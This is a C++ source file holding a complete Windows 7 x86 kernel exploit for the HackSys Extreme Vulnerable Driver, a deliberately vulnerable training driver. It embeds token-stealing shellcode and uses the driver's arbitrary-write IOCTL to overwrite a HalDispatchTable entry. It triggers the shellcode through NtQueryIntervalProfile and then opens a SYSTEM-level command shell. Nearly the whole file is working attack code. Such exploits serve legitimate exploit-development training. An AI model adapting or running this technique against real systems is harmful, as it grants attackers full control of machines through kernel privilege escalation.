// HEVD-ArbitraryOverwritex86win7.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>
#include <string.h>
#include <stdio.h>
#include <winioctl.h>
#include <stdint.h>
#include <malloc.h>

typedef NTSTATUS(__stdcall *_NtQueryIntervalProfile)(
	ULONG ProfileSource,
	PULONG Interval
);

#pragma comment(lib,"ntdll.lib")

FARPROC WINAPI KernelSymbolInfo(LPCSTR lpSymbolName)
{
	typedef enum _SYSTEM_INFORMATION_CLASS {
		SystemBasicInformation = 0,
		SystemPerformanceInformation = 2,
		SystemTimeOfDayInformation = 3,
		SystemProcessInformation = 5,
		SystemProcessorPerformanceInformation = 8,
		SystemModuleInformation = 11,
		SystemInterruptInformation = 23,
		SystemExceptionInformation = 33,
		SystemRegistryQuotaInformation = 37,
		SystemLookasideInformation = 45
	} SYSTEM_INFORMATION_CLASS;

	typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
		HANDLE Section;
		PVOID MappedBase;
		PVOID ImageBase;
		ULONG ImageSize;
		ULONG Flags;
		USHORT LoadOrderIndex;
		USHORT InitOrderIndex;
		USHORT LoadCount;
		USHORT OffsetToFileName;
		UCHAR FullPathName[256];
	} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

	typedef struct _SYSTEM_MODULE_INFORMATION {
		ULONG NumberOfModules;
		SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
	} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

	typedef NTSTATUS(NTAPI *_NtQuerySystemInformation)(
		SYSTEM_INFORMATION_CLASS SystemInformationClass,
		PVOID SystemInformation,
		ULONG SystemInformationLength,
		PULONG ReturnLength
	);

	DWORD len;
	PSYSTEM_MODULE_INFORMATION ModuleInfo;
	LPVOID kernelBase = NULL;
	PUCHAR kernelImage = NULL;
	HMODULE hUserSpaceKernel;
	LPCSTR lpKernelName = NULL;
	FARPROC pUserKernelSymbol = NULL;
	FARPROC pLiveFunctionAddress = NULL;


	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
	if (NtQuerySystemInformation == NULL) {
		return NULL;
	}

	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(
		NULL, len, MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);
	if (!ModuleInfo)
	{
		return NULL;
	}

	NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);

	kernelBase = ModuleInfo->Module[0].ImageBase;
	kernelImage = ModuleInfo->Module[0].FullPathName;

	wprintf(L"Ntoskrnl Base Address is at: 0x%p \n", kernelBase);

	/* Find exported Kernel Functions */

	lpKernelName = (LPCSTR)(ModuleInfo->Module[0].FullPathName + ModuleInfo->Module[0].OffsetToFileName);

	hUserSpaceKernel = LoadLibraryExA(lpKernelName, 0, 0);
	if (hUserSpaceKernel == NULL)
	{
		VirtualFree(ModuleInfo, 0, MEM_RELEASE);
		printf("error load library");
		return NULL;
	}

	pUserKernelSymbol = GetProcAddress(hUserSpaceKernel, lpSymbolName);
	if (pUserKernelSymbol == NULL)
	{
		VirtualFree(ModuleInfo, 0, MEM_RELEASE);
		printf("error load library");
		return NULL;
	}

	pLiveFunctionAddress = (FARPROC)((PUCHAR)pUserKernelSymbol - (PUCHAR)hUserSpaceKernel + (PUCHAR)kernelBase);

	FreeLibrary(hUserSpaceKernel);
	VirtualFree(ModuleInfo, 0, MEM_RELEASE);

	return pLiveFunctionAddress;
}

#define offset 2080 

#define ioctl CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)

const char kDevName[] = "\\\\.\\HackSysExtremeVulnerableDriver";

int main()
{
	CHAR win7x86pl[] = "\x60"
		"\x64\xA1\x24\x01\x00\x00"
		"\x8B\x40\x50"
		"\x89\xC1"
		"\x8B\x98\xF8\x00\x00\x00"
		"\xBA\x04\x00\x00\x00"
		"\x8B\x80\xB8\x00\x00\x00"
		"\x2D\xB8\x00\x00\x00"
		"\x39\x90\xB4\x00\x00\x00"
		"\x75\xED"
		"\x8B\x90\xF8\x00\x00\x00"
		"\x89\x91\xF8\x00\x00\x00"
		"\x61"
		"\xC3"
		;

	HANDLE dev = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		NULL,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL
	);
	if (dev == INVALID_HANDLE_VALUE) {
		return -1;
	}
	LPVOID payload_ptr = NULL;
	printf("device Handle obtained at: 0x%p\n", &dev);
	LPCSTR lpWriteTargetName = "HalDispatchTable";
	FARPROC fpWriteTarget = NULL;
	LPVOID lpWriteTargetAddress = NULL;
	LPVOID lpvPayload = VirtualAlloc(
		0,
		sizeof(win7x86pl),
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE
	);
	printf("allocated payload placed at: 0x%p\n", &lpvPayload);
	memcpy(lpvPayload, win7x86pl, sizeof(win7x86pl));
	LPVOID lpSourceTargetAddress = (LPVOID)malloc(sizeof(LPVOID));
	lpSourceTargetAddress = &lpvPayload;
	fpWriteTarget = KernelSymbolInfo(lpWriteTargetName);
	if (fpWriteTarget == NULL)
	{
		wprintf(L" -> Unable to find memory address!\n\n");
		CloseHandle(dev);
		exit(-1);
	}
	lpWriteTargetAddress = (LPVOID)((ULONG)fpWriteTarget + 0x4);
	printf("HalDispatchTable pointer address for overwrite: 0x%p\n", &lpWriteTargetAddress);
	auto chOverwriteBuffer = (PUCHAR)malloc(sizeof(PUCHAR) * 2);
	memcpy(chOverwriteBuffer, &lpSourceTargetAddress, 4);
	memcpy(chOverwriteBuffer + 4, &lpWriteTargetAddress, 4);
	printf("Sending ioctl....\n");
	DWORD junk = 0;                   

	auto bResult = DeviceIoControl(
		dev,	
		0x22200B,			
		chOverwriteBuffer, 8,		
		NULL, 0,		
		&junk,			
		(LPOVERLAPPED)NULL
	);	

	_NtQueryIntervalProfile NtQueryIntervalProfile = (_NtQueryIntervalProfile)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryIntervalProfile");
	if (NtQueryIntervalProfile == NULL) {
		printf("error locating QueryIntervalProfile");
		return NULL;
	}

	printf("Calling NtQueryIntervalProfile...\n\n\n");
	NtQueryIntervalProfile(0xa77b, &junk);
	
	system("cmd.exe");
	CloseHandle(dev);
	system("pause");
	return 0;
}

